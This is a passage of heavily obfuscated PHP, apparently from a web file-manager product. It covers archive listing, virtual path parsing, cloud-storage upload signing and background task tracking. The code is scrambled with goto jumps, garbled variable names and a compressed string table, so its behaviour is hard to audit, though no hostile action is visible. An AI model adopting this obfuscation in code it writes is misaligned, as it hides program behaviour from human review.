D¨¨≤˜•‚ê; d¨öõá≠Ùù: return $Cî…ºï——∆[$bÀÎå⁄Öã™[1038]]; goto B◊äΩüåàÃ; Eêÿ‘ÈÑ†ÿ: if (isset($b∫Ö£ŒÉŸÈ)) { $fÆ‘ùÿ∫≠ú = array($b∫Ö£ŒÉŸÈ[$bÀÎå⁄Öã™[75]], $b∫Ö£ŒÉŸÈ[$bÀÎå⁄Öã™[1040]], $b∫Ö£ŒÉŸÈ[$bÀÎå⁄Öã™[28]]); $Dªﬁ¯åëÏ√ = md5(implode($bÀÎå⁄Öã™[70], $fÆ‘ùÿ∫≠ú)) . $bÀÎå⁄Öã™[93] . get_path_ext($b∫Ö£ŒÉŸÈ[$bÀÎå⁄Öã™[28]]); } else { $fÆ‘ùÿ∫≠ú = array($B«⁄ê’ÿ¯∑[$bÀÎå⁄Öã™[28]], $B«⁄ê’ÿ¯∑[$bÀÎå⁄Öã™[75]], $B«⁄ê’ÿ¯∑[$bÀÎå⁄Öã™[77]]); $Dªﬁ¯åëÏ√ = md5(implode($bÀÎå⁄Öã™[70], $fÆ‘ùÿ∫≠ú)) . $bÀÎå⁄Öã™[93] . $eç◊´Î∑⁄©; } if ($fπ—≈é‘¨ú == -1) { $Aı∑¢‡á·≠ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\x69\x65\167\57{$CáÙù¨å±œ}\x2f{$Dªﬁ¯åëÏ√}\56\154\157\147"; $CÈ∫ØÑà°À = self::infoFull($Aı∑¢‡á·≠); if ($CÈ∫ØÑà°À) { $Aı∑¢‡á·≠ = $CÈ∫ØÑà°À[$bÀÎå⁄Öã™[75]]; $d·——ÇΩÂß = self::getContent($Aı∑¢‡á·≠); if ($d·——ÇΩÂß) { $AÜÛØàºŒñ = json_decode($d·——ÇΩÂß, !0); if (count($AÜÛØàºŒñ) >= $f€Æ˜®ﬁ·ê) { show_json(sprintf(LNG($bÀÎå⁄Öã™[1042]), count($AÜÛØàºŒñ)), !1); } return $AÜÛØàºŒñ; } } else { $Aı∑¢‡á·≠ = self::mkfile($Aı∑¢‡á·≠); } } $AŒíÌÓÊè∂ = TEMP_FILES . $CáÙù¨å±œ; goto fÖíÃ·Ì¨ë; BÕ≤ÍÙ¶‹‘: $B«⁄ê’ÿ¯∑ = self::info($Bâàì¶√ÙË); $eç◊´Î∑⁄© = self::fileExt($B«⁄ê’ÿ¯∑); $CáÙù¨å±œ = self::tmpFileName($B«⁄ê’ÿ¯∑); goto Eêÿ‘ÈÑ†ÿ; CÚÎ§–ªŸæ: $f€Æ˜®ﬁ·ê = 50000; if (request_url_safe($D∏—Ë÷ı€£)) { $b∫Ö£ŒÉŸÈ = parse_url_query($D∏—Ë÷ı€£); if (!isset($b∫Ö£ŒÉŸÈ[$bÀÎå⁄Öã™[75]])) { show_json($bÀÎå⁄Öã™[1041], !1); } } $Bâàì¶√ÙË = isset($b∫Ö£ŒÉŸÈ) ? $b∫Ö£ŒÉŸÈ[$bÀÎå⁄Öã™[75]] : $D∏—Ë÷ı€£; goto BÕ≤ÍÙ¶‹‘; B◊äΩüåàÃ: } private static function fileExt($f˘·√°ª‰Ê) { $fÀ≤‚Œ÷Òã =& $_SERVER[—Ω]; $C·È£ıá± = $f˘·√°ª‰Ê[$fÀ≤‚Œ÷Òã[157]]; if ($C·È£ıá± == $fÀ≤‚Œ÷Òã[1045]) { $B∏±≈Öøê¨ = $fÀ≤‚Œ÷Òã[1046]; if (substr($f˘·√°ª‰Ê[$fÀ≤‚Œ÷Òã[28]], -strlen($B∏±≈Öøê¨)) == $B∏±≈Öøê¨) { $C·È£ıá± = $fÀ≤‚Œ÷Òã[1047]; } } self::archiveExt($C·È£ıá±); return $C·È£ıá±; } private static function zipFileList($cÉËòé¯äÿ, $Dƒµ¡Ñ‚Ì¯ = false) { $EéÏ¥√„ÿÂ =& $_SERVER[—Ω]; $E±øœÓ§¬© = array(); foreach ($cÉËòé¯äÿ as $c çﬂÖË€ò) { $C®¿°çÌß® = $c çﬂÖË€ò[$EéÏ¥√„ÿÂ[75]]; if ($Dƒµ¡Ñ‚Ì¯) { $C®¿°çÌß® = self::copy($c çﬂÖË€ò[$EéÏ¥√„ÿÂ[75]], $Dƒµ¡Ñ‚Ì¯, $EéÏ¥√„ÿÂ[754]); } if ($C®¿°çÌß® && self::local()->exist($C®¿°çÌß®)) { $E±øœÓ§¬©[$c çﬂÖË€ò[$EéÏ¥√„ÿÂ[75]]] = $C®¿°çÌß®; } } if (!empty($E±øœÓ§¬©)) { return array_values($E±øœÓ§¬©); } show_json(LNG($EéÏ¥√„ÿÂ[1048]), !1); } public static function tmpFileName($cÉ˘∏ùê€ã) { $cçÛÎû‡ì =& $_SERVER[—Ω]; $F‘âŸÚÌÜ÷ = array($cÉ˘∏ùê€ã[$cçÛÎû‡ì[28]], $cÉ˘∏ùê€ã[$cçÛÎû‡ì[75]], $cÉ˘∏ùê€ã[$cçÛÎû‡ì[77]], $cÉ˘∏ùê€ã[$cçÛÎû‡ì[455]]); return md5(implode($cçÛÎû‡ì[70], $F‘âŸÚÌÜ÷)); } private static function localFilePath($A—ﬁÑè†Éﬁ, $eëÇÙ˜á∂è) { goto Dûˆµ∆âÒ±; Dûˆµ∆âÒ±: $E“ÑÚ›‘Ÿ´ =& $_SERVER[—Ω]; if ($eëÇÙ˜á∂è == $E“ÑÚ›‘Ÿ´[1049] && strtoupper(substr(PHP_OS, 0, 3)) == $E“ÑÚ›‘Ÿ´[1050]) { return !1; } $e∂Œ¡ˆÉŸ‰ = KodIO::parse($A—ﬁÑè†Éﬁ); goto aèÓÉ›∆ï≥; aèÓÉ›∆ï≥: if ($e∂Œ¡ˆÉŸ‰[$E“ÑÚ›‘Ÿ´[29]] == KodIO::KOD_SOURCE) { $Eﬁı÷®∏îï = Model($E“ÑÚ›‘Ÿ´[762])->fileInfoGet(KodIO::sourceID($A—ﬁÑè†Éﬁ)); if (!$Eﬁı÷®∏îï[$E“ÑÚ›‘Ÿ´[75]]) { show_json($E“ÑÚ›‘Ÿ´[1051], !1); } $A—ﬁÑè†Éﬁ = $Eﬁı÷®∏îï[$E“ÑÚ›‘Ÿ´[75]]; } $Cµ´Ó´Òå£ = self::init($A—ﬁÑè†Éﬁ); $Bâ˘Ô÷ƒÁŒ = $Cµ´Ó´Òå£->getType(); goto EΩß∆∂∆à; EΩß∆∂∆à: if ($Bâ˘Ô÷ƒÁŒ == $E“ÑÚ›‘Ÿ´[103] || $Bâ˘Ô÷ƒÁŒ == $E“ÑÚ›‘Ÿ´[1052]) { if (!$Cµ´Ó´Òå£->exist($Cµ´Ó´Òå£->path)) { show_json(LNG($E“ÑÚ›‘Ÿ´[102]), !1); } return $Cµ´Ó´Òå£->path; } return !1; goto C©à∞≤Û◊Ì; C©à∞≤Û◊Ì: } private static function archiveExt($BŸÛ∂é˘Õ≥ = '') { $GLOBALS[$_SERVER[—Ω][1053]] = $BŸÛ∂é˘Õ≥; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\x52\x65\143\x79\x63\154\x65\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\x46\151\154\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\x69\x6c\x65\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\160\x52\x6f\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\150\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\x53\150\x61\162\x65\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\145\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\x65\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\x49\164\145\x6d\114\151\156\153\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\143\150\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\143\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\x65\156\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\145\162\x7d"; public static function typeList() { $F•äöÂﬂÙ‘ =& $_SERVER[—Ω]; return array($F•äöÂﬂÙ‘[1054] => self::KOD_SOURCE, $F•äöÂﬂÙ‘[1055] => self::KOD_USER_RECYCLE, $F•äöÂﬂÙ‘[1056] => self::KOD_USER_FAV, $F•äöÂﬂÙ‘[1057] => self::KOD_USER_FILE_TAG, $F•äöÂﬂÙ‘[1058] => self::KOD_USER_FILE_TYPE, $F•äöÂﬂÙ‘[1059] => self::KOD_GROUP_ROOT_SELF, $F•äöÂﬂÙ‘[1060] => self::KOD_USER_SHARE, $F•äöÂﬂÙ‘[1061] => self::KOD_USER_SHARE_LINK, $F•äöÂﬂÙ‘[1062] => self::KOD_USER_SHARE_TO_ME, $F•äöÂﬂÙ‘[1063] => self::KOD_SHARE_ITEM, $F•äöÂﬂÙ‘[1064] => self::KOD_SHARE_LINK, $F•äöÂﬂÙ‘[1065] => self::KOD_SEARCH, $F•äöÂﬂÙ‘[1066] => self::KOD_BLOCK, $F•äöÂﬂÙ‘[1067] => self::KOD_IO, $F•äöÂﬂÙ‘[1068] => self::KOD_USER_RECENT, $F•äöÂﬂÙ‘[1069] => self::KOD_USER_DRIVER); } public static function parse($dîïë“ˆßæ) { goto Fß÷àËãëá; Dƒá∏´€ÀÚ: preg_match($A›Òƒ≈°ô•[1070], $dîïë“ˆßæ, $b¡âÖéµçØ); $bó´∞Õîñ€ = array($A›Òƒ≈°ô•[385] => !1, $A›Òƒ≈°ô•[1071] => !1, $A›Òƒ≈°ô•[382] => !1, $A›Òƒ≈°ô•[75] => $dîïë“ˆßæ, $A›Òƒ≈°ô•[1016] => !1, $A›Òƒ≈°ô•[1015] => $A›Òƒ≈°ô•[33]); if (is_array($b¡âÖéµçØ) && count($b¡âÖéµçØ) == 5) { $FóêÕâ¨Üè = $A›Òƒ≈°ô•[1072] . $b¡âÖéµçØ[2] . $A›Òƒ≈°ô•[312]; if (in_array($FóêÕâ¨Üè, $Dùûˆ‡‚‡—)) { $bó´∞Õîñ€[$A›Òƒ≈°ô•[1016]] = $b¡âÖéµçØ[1]; $bó´∞Õîñ€[$A›Òƒ≈°ô•[29]] = $FóêÕâ¨Üè; $bó´∞Õîñ€[$A›Òƒ≈°ô•[1073]] = substr($FóêÕâ¨Üè, 1, -1); $bó´∞Õîñ€[$A›Òƒ≈°ô•[364]] = $b¡âÖéµçØ[3]; } $bó´∞Õîñ€[$A›Òƒ≈°ô•[1015]] = $b¡âÖéµçØ[4]; } goto f∆éÂää∏ß; f∆éÂää∏ß: $E¶√‹Ãá‚÷ = array($A›Òƒ≈°ô•[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $bó´∞Õîñ€[$A›Òƒ≈°ô•[1074]] = in_array($bó´∞Õîñ€[$A›Òƒ≈°ô•[29]], $E¶√‹Ãá‚÷); return $bó´∞Õîñ€; goto F°¶√Æ”˜ê; Fß÷àËãëá: $A›Òƒ≈°ô• =& $_SERVER[—Ω]; $dîïë“ˆßæ = self::clear($dîïë“ˆßæ); $Dùûˆ‡‚‡— = array_values(self::typeList()); goto Dƒá∏´€ÀÚ; F°¶√Æ”˜ê: } public static function clear($cì—¬≤õ∞∆) { goto d∫◊≠†ﬁëÒ; d÷õ£è∆ÙÂ: if (substr($cì—¬≤õ∞∆, 0, 3) == $D‡áãƒ€œﬁ[1076]) { $cì—¬≤õ∞∆ = substr($cì—¬≤õ∞∆, 3); } while (strstr($cì—¬≤õ∞∆, $fÍÙêÎ‚´„)) { $cì—¬≤õ∞∆ = str_replace($fÍÙêÎ‚´„, $D‡áãƒ€œﬁ[8], $cì—¬≤õ∞∆); } $cì—¬≤õ∞∆ = preg_replace($D‡áãƒ€œﬁ[1077], $D‡áãƒ€œﬁ[8], $cì—¬≤õ∞∆); goto EÖÁµö≠”‚; d∫◊≠†ﬁëÒ: $D‡áãƒ€œﬁ =& $_SERVER[—Ω]; $cì—¬≤õ∞∆ = str_replace($D‡áãƒ€œﬁ[95], $D‡áãƒ€œﬁ[8], $cì—¬≤õ∞∆); $fÍÙêÎ‚´„ = $D‡áãƒ€œﬁ[1075]; goto d÷õ£è∆ÙÂ; EÖÁµö≠”‚: if ($cì—¬≤õ∞∆ == $D‡áãƒ€œﬁ[8]) { return $D‡áãƒ€œﬁ[8]; } $cì—¬≤õ∞∆ = rtrim($cì—¬≤õ∞∆, $D‡áãƒ€œﬁ[8]); return $cì—¬≤õ∞∆; goto C·ÖΩÒë≤Û; C·ÖΩÒë≤Û: } public static function sourceID($f±¶‰‹ê’◊) { $D¥ÏÇ˘•ÙÖ =& $_SERVER[—Ω]; $EÚ–ìÍèÉ  = self::parse($f±¶‰‹ê’◊); if ($EÚ–ìÍèÉ [$D¥ÏÇ˘•ÙÖ[29]] !== self::KOD_SOURCE) { show_json(LNG($D¥ÏÇ˘•ÙÖ[1078]), !1); } return $EÚ–ìÍèÉ [$D¥ÏÇ˘•ÙÖ[364]]; } public static function make($F± ‚≤Ì¿î) { if (!$F± ‚≤Ì¿î) { return !1; } return self::makePath(self::KOD_SOURCE, intval($F± ‚≤Ì¿î)); } public static function makeShare($aÌü Çƒúı, $bﬂﬁ¯⁄±—™) { return self::makePath(self::KOD_SHARE_ITEM, $aÌü Çƒúı, $bﬂﬁ¯⁄±—™); } public static function makeFileTypePath($F∂˜¡˘è§–) { return self::makePath(self::KOD_USER_FILE_TYPE, $F∂˜¡˘è§–); } public static function makeFileTagPath($D¢îËñàùä) { return self::makePath(self::KOD_USER_FILE_TAG, $D¢îËñàùä); } public static function makePath($fñÑ∫˜˜À, $FâÜÌàë√Ç = '', $f®â‚Üàﬁä = '') { $f¨±‰°∑èŸ =& $_SERVER[—Ω]; $CäëŸŒ≈Ã∑ = substr($fñÑ∫˜˜À, 1, -1); $døÑ´ß€ﬁƒ = $f¨±‰°∑èŸ[1079] . $CäëŸŒ≈Ã∑ . $f¨±‰°∑èŸ[1080] . $FâÜÌàë√Ç . $f¨±‰°∑èŸ[1081]; $døÑ´ß€ﬁƒ = $f®â‚Üàﬁä ? $døÑ´ß€ﬁƒ . $f®â‚Üàﬁä . $f¨±‰°∑èŸ[8] : $døÑ´ß€ﬁƒ; return $døÑ´ß€ﬁƒ; } public static function hashPath($DÊ´Ì€ûÎ™) { $FåæËÇêÿô =& $_SERVER[—Ω]; $CÚ√º∫∂≤ã = is_array($DÊ´Ì€ûÎ™) ? $DÊ´Ì€ûÎ™ : IO::info($DÊ´Ì€ûÎ™); $d›˜àËÀÕè = _get($CÚ√º∫∂≤ã, $FåæËÇêÿô[1082], $FåæËÇêÿô[33]); if (!$d›˜àËÀÕè) { $c«ªüå—‡ö = KodIO::parse($CÚ√º∫∂≤ã[$FåæËÇêÿô[75]]); if (!$c«ªüå—‡ö[$FåæËÇêÿô[29]]) { $d›˜àËÀÕè = IO::hashSimple($CÚ√º∫∂≤ã[$FåæËÇêÿô[75]]); } } if (!$d›˜àËÀÕè) { $d›˜àËÀÕè = md5($CÚ√º∫∂≤ã[$FåæËÇêÿô[75]] . $CÚ√º∫∂≤ã[$FåæËÇêÿô[77]] . $CÚ√º∫∂≤ã[$FåæËÇêÿô[107]]); } return $d›˜àËÀÕè; } public static function initSystemPath() { $E⁄Ñ˘√«Ü∞ =& $_SERVER[—Ω]; if (defined($E⁄Ñ˘√«Ü∞[1083])) { return; } define($E⁄Ñ˘√«Ü∞[1083], self::systemPath($E⁄Ñ˘√«Ü∞[1084])); define($E⁄Ñ˘√«Ü∞[1085], self::systemPath($E⁄Ñ˘√«Ü∞[1086])); define($E⁄Ñ˘√«Ü∞[1087], self::systemPath($E⁄Ñ˘√«Ü∞[1088])); define($E⁄Ñ˘√«Ü∞[1089], self::systemPath($E⁄Ñ˘√«Ü∞[1090])); } private static function systemPath($fê⁄ÏçÒ»∆) { goto aå‘ï”°µ; aå‘ï”°µ: $e¥•ê™ÔŒÍ =& $_SERVER[—Ω]; $f”ÃÎﬂ∆ô€ = $e¥•ê™ÔŒÍ[1091] . ucfirst($fê⁄ÏçÒ»∆); $F‰£à ∂ßÎ = Model($e¥•ê™ÔŒÍ[1092])->get($f”ÃÎﬂ∆ô€); goto cªÿ¬ÎÊ◊ﬂ; CÚÉÚÉËõŒ: return $F‰£à ∂ßÎ; goto dß›Ïë⁄ÀÕ; cªÿ¬ÎÊ◊ﬂ: if ($F‰£à ∂ßÎ) { return $F‰£à ∂ßÎ; } if ($fê⁄ÏçÒ»∆ == $e¥•ê™ÔŒÍ[1084]) { $F‰£à ∂ßÎ = self::make(Model($e¥•ê™ÔŒÍ[762])->systemRootPathAdd($e¥•ê™ÔŒÍ[1093])); } else { $F‰£à ∂ßÎ = self::systemPath($e¥•ê™ÔŒÍ[1084]); $AÆÕø∫“≠â = self::sourceID($F‰£à ∂ßÎ); $F‰£à ∂ßÎ = self::make(Model($e¥•ê™ÔŒÍ[762])->mkdir($AÆÕø∫“≠â, $fê⁄ÏçÒ»∆)); } Model($e¥•ê™ÔŒÍ[1092])->set($f”ÃÎﬂ∆ô€, $F‰£à ∂ßÎ); goto CÚÉÚÉËõŒ; dß›Ïë⁄ÀÕ: } public static function systemFolder($EæäæÚ«Øë) { $fŒˆ≈‚≈ÁÃ = IO_PATH_SYSTEM_SOURCE . $EæäæÚ«Øë; $eæùÊÑÂπà = Cache::get($fŒˆ≈‚≈ÁÃ); if (!$eæùÊÑÂπà) { $e˘§ıå∞ﬂ‰ = IO::infoFull($fŒˆ≈‚≈ÁÃ); if (!$e˘§ıå∞ﬂ‰) { $eæùÊÑÂπà = IO::mkdir($fŒˆ≈‚≈ÁÃ, REPEAT_SKIP); } else { $eæùÊÑÂπà = $e˘§ıå∞ﬂ‰[$_SERVER[—Ω][75]]; } Cache::set($fŒˆ≈‚≈ÁÃ, $eæùÊÑÂπà, 3600 * 10); } return $eæùÊÑÂπà; } public static function defaultDriver() { return Model($_SERVER[—Ω][714])->defaultDriver(); } public static function defaultIO() { $eÁÜ¨Ïˆâ• =& $_SERVER[—Ω]; $aﬂÁÖ¶ñ“Á = self::defaultDriver(); return $eÁÜ¨Ïˆâ•[1094] . $aﬂÁÖ¶ñ“Á[$eÁÜ¨Ïˆâ•[364]] . $eÁÜ¨Ïˆâ•[1081]; } public static function fileTypeList() { $bÛ†Õ≠∏ëµ =& $_SERVER[—Ω]; $a®Æﬁ√Ù”ü = $GLOBALS[$bÛ†Õ≠∏ëµ[6]][$bÛ†Õ≠∏ëµ[1095]]; foreach ($a®Æﬁ√Ù”ü as $A·¬≤âˆ÷◊ => $aΩ∫⁄îêî‘) { $AÓ§ê∞Àêé = $bÛ†Õ≠∏ëµ[1096] . $A·¬≤âˆ÷◊; $b∫®≈Ô«ÈØ = LNG($AÓ§ê∞Àêé); if ($AÓ§ê∞Àêé != $b∫®≈Ô«ÈØ) { $a®Æﬁ√Ù”ü[$A·¬≤âˆ÷◊][$bÛ†Õ≠∏ëµ[28]] = $b∫®≈Ô«ÈØ; } } return $a®Æﬁ√Ù”ü; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($f√∫÷Üê´•) { parent::__construct($f√∫÷Üê´•); $this->signatureVersion($_SERVER[—Ω][197]); } public function uploadFormData($E¡”Ω∂´¶–, $DÿøΩ–≠—ó = 3600) { goto F◊ãàêÕ•Ó; DŸëˆ—ƒö«: $câÌŸæÙﬁß = array($Bµëéè«ç∆[1099] => $a›ÛäåÑ„‰, $Bµëéè«ç∆[1100] => array(array($Bµëéè«ç∆[1101] => $BÜ®Ûºπ’ã), array($Bµëéè«ç∆[1102] => $this->bucket), array($Bµëéè«ç∆[1103], $Bµëéè«ç∆[1104], $Bµëéè«ç∆[33]), array($Bµëéè«ç∆[1105] => $E“ôµˆ†ñï), array($Bµëéè«ç∆[1106] => $aàéÌ¶ïÒÍ), array($Bµëéè«ç∆[1107] => $this->accessKey), array($Bµëéè«ç∆[1108] => $DÌ›ê∂ëΩ“))); $câÌŸæÙﬁß = json_encode($câÌŸæÙﬁß); $cù¨’´âΩÏ = hash_hmac($Bµëéè«ç∆[215], $DÌ›ê∂ëΩ“, $this->secret); goto a‘çäéê“÷; F◊ãàêÕ•Ó: $Bµëéè«ç∆ =& $_SERVER[—Ω]; $BÜ®Ûºπ’ã = $Bµëéè«ç∆[182]; $aàéÌ¶ïÒÍ = $Bµëéè«ç∆[215]; goto d√œ‰ﬂÇ™Ú; d√œ‰ﬂÇ™Ú: $E“ôµˆ†ñï = $Bµëéè«ç∆[1097]; $a›ÛäåÑ„‰ = gmdate($Bµëéè«ç∆[1098], time() + $DÿøΩ–≠—ó); $DÌ›ê∂ëΩ“ = (string) time() . $Bµëéè«ç∆[67] . (string) (time() + $DÿøΩ–≠—ó); goto DŸëˆ—ƒö«; Då«±Ñ·≤˘: return $aπü¿«áı®; goto e⁄√ƒÑ¥Œà; a‘çäéê“÷: $B¬Í†æÖ†‹ = sha1($câÌŸæÙﬁß); $EÌº±é‘¨Ó = hash_hmac($Bµëéè«ç∆[215], $B¬Í†æÖ†‹, $cù¨’´âΩÏ); $aπü¿«áı® = array($Bµëéè«ç∆[1101] => $BÜ®Ûºπ’ã, $Bµëéè«ç∆[1105] => $E“ôµˆ†ñï, $Bµëéè«ç∆[1109] => base64_encode($câÌŸæÙﬁß), $Bµëéè«ç∆[1106] => $aàéÌ¶ïÒÍ, $Bµëéè«ç∆[1107] => $this->accessKey, $Bµëéè«ç∆[1110] => $DÌ›ê∂ëΩ“, $Bµëéè«ç∆[1111] => $EÌº±é‘¨Ó, $Bµëéè«ç∆[166] => $this->getHost()); goto Då«±Ñ·≤˘; e⁄√ƒÑ¥Œà: } public function fileOutLink($aõë—ﬂºÑ…) { $cﬂÈüêÚñ’ =& $_SERVER[—Ω]; if (substr($aõë—ﬂºÑ…, 0, 7) == $cﬂÈüêÚñ’[1112]) { $aõë—ﬂºÑ… = $cﬂÈüêÚñ’[1113] . substr($aõë—ﬂºÑ…, 7); } header($cﬂÈüêÚñ’[153] . $aõë—ﬂºÑ…); die; } } goto DóÙÓ“ßã†; FÿåÛ‡…°Ç: define($_SERVER[—Ω][0], $_SERVER[—Ω][1]); $_SERVER[ªƒÓ™éå] = explode($_SERVER[—Ω][2], gzinflate(substr($_SERVER[—Ω][3], 10, -8))); function Model($Fﬁ—ôÉÔùì = '', $B–˘‡π‘ó‘ = '', $cê¨çÿâÎè = '') { goto bÒÒ≥£Ú∏´; BÒ£àúç†å: if (isset($e‹€ıÙÿß©[$E∏æ¥‘¬Î¿])) { return $e‹€ıÙÿß©[$E∏æ¥‘¬Î¿]; } if ($Fﬁ—ôÉÔùì) { $Fﬁ—ôÉÔùì = strtoupper($Fﬁ—ôÉÔùì[0]) . substr($Fﬁ—ôÉÔùì, 1); $CÆø¿å√äÔ = $Fﬁ—ôÉÔùì . $eË·ıÙùíÛ[1]; if (class_exists($CÆø¿å√äÔ)) { $e‹€ıÙÿß©[$E∏æ¥‘¬Î¿] = new $CÆø¿å√äÔ(); return $e‹€ıÙÿß©[$E∏æ¥‘¬Î¿]; } } if (!$cê¨çÿâÎè) { $cê¨çÿâÎè = $GLOBALS[$eË·ıÙùíÛ[2]][$eË·ıÙùíÛ[3]]; } goto FÎ”‰û¯Íù; FÎ”‰û¯Íù: $e‹€ıÙÿß©[$E∏æ¥‘¬Î¿] = new ModelBase($Fﬁ—ôÉÔùì, $B–˘‡π‘ó‘, $cê¨çÿâÎè); return $e‹€ıÙÿß©[$E∏æ¥‘¬Î¿]; goto c µ¿Ë◊÷—; bÒÒ≥£Ú∏´: $eË·ıÙùíÛ =& $_SERVER[ªƒÓ™éå]; static $e‹€ıÙÿß© = array(); $E∏æ¥‘¬Î¿ = strtolower($B–˘‡π‘ó‘ . $eË·ıÙùíÛ[0] . $Fﬁ—ôÉÔùì); goto BÒ£àúç†å; c µ¿Ë◊÷—: } goto fñÛÎíÚ¥ã; Cø ’É¢äö: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\162\165\x6e\156\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($aÿ¯†–õæ≤, $báí∂é≥§Õ = '', $BäÙÛä´‘Ñ = 0, $bÖª∑—Æ°ã = '') { goto B‚âÀÚâΩÜ; Fåó≥≤´£ê: Hook::trigger($Aáòª∞Ò£ë[1428], $this->task); $this->task[$Aáòª∞Ò£ë[1422]] = timeFloat(); self::valueSet($this->task[$Aáòª∞Ò£ë[364]], $this->task); goto EâÃπúãö∞; Aåé‹‰ÓﬂÉ: Hook::bind($Aáòª∞Ò£ë[1383], array($this, $Aáòª∞Ò£ë[1425])); Hook::bind($Aáòª∞Ò£ë[1426], array($this, $Aáòª∞Ò£ë[1427])); $this->startAfter(); goto Fåó≥≤´£ê; B‚âÀÚâΩÜ: $Aáòª∞Ò£ë =& $_SERVER[—Ω]; if (self::get($aÿ¯†–õæ≤)) { return; } $this->task = array($Aáòª∞Ò£ë[364] => $aÿ¯†–õæ≤, $Aáòª∞Ò£ë[1417] => USER_ID, $Aáòª∞Ò£ë[1325] => $bÖª∑—Æ°ã, $Aáòª∞Ò£ë[29] => $báí∂é≥§Õ, $Aáòª∞Ò£ë[984] => $Aáòª∞Ò£ë[33], $Aáòª∞Ò£ë[982] => $BäÙÛä´‘Ñ, $Aáòª∞Ò£ë[994] => 0, $Aáòª∞Ò£ë[1418] => 0, $Aáòª∞Ò£ë[1419] => 0, $Aáòª∞Ò£ë[1420] => timeFloat(), $Aáòª∞Ò£ë[1421] => 0, $Aáòª∞Ò£ë[1422] => 0, $Aáòª∞Ò£ë[1423] => 0, $Aáòª∞Ò£ë[1424] => 0, $Aáòª∞Ò£ë[699] => $Aáòª∞Ò£ë[1381]); goto Aåé‹‰ÓﬂÉ; EâÃπúãö∞: } public function end() { goto F´ÔÂÀ™ÉÉ; F´ÔÂÀ™ÉÉ: $b«Í⁄≈É±™ =& $_SERVER[—Ω]; if (!$this->task) { return; } if ($this->task[$b«Í⁄≈É±™[1422]]) { self::valueSet($this->task[$b«Í⁄≈É±™[364]], !1); } goto f–Ò‡‡®È“; bùˆ◊Öï°‘: Hook::unbind($b«Í⁄≈É±™[1426], array($this, $b«Í⁄≈É±™[1427])); $this->endAfter(); $this->task = !1; goto Féà◊ç®Éå; f–Ò‡‡®È“: $DÜË›Ã»”Ô = timeFloat() - $this->task[$b«Í⁄≈É±™[1420]]; self::log($b«Í⁄≈É±™[1429] . $this->task[$b«Í⁄≈É±™[364]] . $b«Í⁄≈É±™[1430] . $DÜË›Ã»”Ô . $b«Í⁄≈É±™[1431]); Hook::unbind($b«Í⁄≈É±™[1383], array($this, $b«Í⁄≈É±™[1425])); goto bùˆ◊Öï°‘; Féà◊ç®Éå: } public function update($cÜˆÈåé∫Ö = 0) { goto A€ôöãµ„©; A€ôöãµ„©: $fÀãåÈ£Ï¢ =& $_SERVER[—Ω]; $aÇ®…ãŒ–â =& $this->task; if (!$aÇ®…ãŒ–â) { return; } goto d¬Ç¨á»ÕŸ; f¢Ÿ”ŒÕﬁÀ: Hook::trigger($fÀãåÈ£Ï¢[1435], $aÇ®…ãŒ–â); self::valueSet($aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[364]], $aÇ®…ãŒ–â); goto c©™ä¡ªåö; f©Ô≈”îÜë: $f”≠Ñ‰≤ã— = self::get($aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[364]]); $EæÉéÑ»ﬂò = $f”≠Ñ‰≤ã—[$fÀãåÈ£Ï¢[699]]; if ($EæÉéÑ»ﬂò == self::STATYS_KILL) { $cèÚªªÃââ = array($fÀãåÈ£Ï¢[1432] => LNG($fÀãåÈ£Ï¢[1433]), $fÀãåÈ£Ï¢[1036] => !1); Cache::set($fÀãåÈ£Ï¢[1434] . $this->task[$fÀãåÈ£Ï¢[364]], $cèÚªªÃââ, 30); $this->end(); die; } else { if ($EæÉéÑ»ﬂò == self::STATYS_STOP) { $A—üƒÏ¥éÑ = 2; $f”≠Ñ‰≤ã—[$fÀãåÈ£Ï¢[1423]] += $A—üƒÏ¥éÑ; self::valueSet($aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[364]], $f”≠Ñ‰≤ã—); sleep($A—üƒÏ¥éÑ); $this->update(); return; } } goto bó±ÜçÎƒî; cÌïÎåöåã: $this->updateAfter(); $c∞»ﬂä≥µ• = 0.2; if (timeFloat() - $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1422]] < $c∞»ﬂä≥µ•) { return; } goto f©Ô≈”îÜë; bó±ÜçÎƒî: $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[699]] = $EæÉéÑ»ﬂò ? $EæÉéÑ»ﬂò : $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[699]]; $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1423]] = $f”≠Ñ‰≤ã—[$fÀãåÈ£Ï¢[1423]] ? $f”≠Ñ‰≤ã—[$fÀãåÈ£Ï¢[1423]] : 0; $aÇ®…ãŒ–â[$fÀãåÈ£Ï¢[1422]] = timeFloat(); goto f¢Ÿ”ŒÕﬁÀ; d¬Ç¨á»ÕŸ: 